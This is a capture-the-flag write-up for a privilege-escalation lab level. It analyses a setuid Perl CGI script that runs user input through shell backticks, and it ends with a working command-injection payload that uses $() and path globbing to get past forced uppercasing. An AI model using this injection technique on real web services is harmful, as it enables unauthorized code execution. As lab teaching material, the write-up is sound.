# level04

## Scanning

**1. Who are we ?**
```sh
$ id
uid=2012(level12) gid=2012(level12) groups=2012(level12),100(users)
```

**2. Where are we ?** 👀
```sh
$ ls -laR
.:
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
```

## Solution

We found a suspicious file: `/home/user/level12/level12.pl`.

### Privileges

```sh
$ getfacl ./level12.pl 
# file: level12.pl
# owner: flag12
# group: level12
# flags: ss-
user::rwx
group::r-x
group:flag12:rwx		#effective:r-x
mask::r-x
other::r-x
```

We determined `/home/user/level12/level12.pl` is a prime candidate for privilege escalation because:
- It is owned by `flag12` (our target).
- The group owner is `level12` (which matches our user's group).
- It has the `setuid permission bit` (`s`) set, which grants us the owner's privileges during the program's execution.

This means that, during script execution through the user `level12`, the privilege state is as follows:  
- Real UID: `level12`
- Real GUID: `level12`
- Effective UID: `flag12`
- Effective GUID: `level12`

### Script behaviour(s)

`/home/user/level12/level12.pl` is a [perl](https://www.perl.org/) script.
As it is an interpreted language it can be read as is.
```pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  # 1. Capture the two first passed arguments.
  $nn = $_[1];
  $xx = $_[0];
  # 2. Normalize argument 1: uppercase it and strip everything from the first found whitespace.
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  # 3. /!\ Using backsticks, execute in shell.
  # It searches the /tmp/xd file for the given extended-regexp pattern.
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  # 4. Parse the results, assuming a 'KEY:VALUE' pattern and return 1 if the second parameter is found as a VALUE, else 0.
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

# If the first passed argument is 1, print '..', else '.'
sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

# Call `t()` with the HTTP query parameters 'x' and 'y'.
# Using `t()`s output, call `n()` to expose success or failure.
n(t(param("x"), param("y")));
```

Again we are faced with a perl [CGI](http://www-igm.univ-mlv.fr/~dr/XPOSE2001/CGIavecPerl/cgi.html) as seen in [level04](../../level04/ressources//README.md).

### Vulnerability

`/home/user/level12/level12.pl` uses [**backsticks**](https://www.php.net/manual/en/language.operators.execution.php) with vaguely normalized user input.
This provides us with a rather direct **Arbitrary Code Execution** (ACE) opportunity.

`/home/user/level12/level12.pl` is executed through a CGI-enabled web server that enforces a sandboxed environment. We cannot perform standard environment manipulation.

Furthermore, the script imposes significant technical hurdles due to its internal payload normalization process. The input is forced to uppercase and truncated at the first whitespace character, leading to the following constraints:
- Standard Unix binaries are case-sensitive and typically lowercased, thus cannot be invoked.
- Unix file paths are case-sensitive, and we lack the necessary permissions to create uppercase binaries within system directories or any path included in the `$PATH` environment variable.

Being quite limited, we decided to check path resolution options such as those provided by posix compatible [shell globbing](https://man7.org/linux/man-pages/man7/glob.7.html).


```sh
$ echo 'getflag > /tmp/checkflag' > /tmp/EXPLOIT && chmod +x /tmp/EXPLOIT
# Let's overtake the execution context using $() and call our path using shell globbing.
$ curl localhost:4646?x='$(/*/EXPLOIT)'; cat /tmp/checkflag
```

And there is our flag !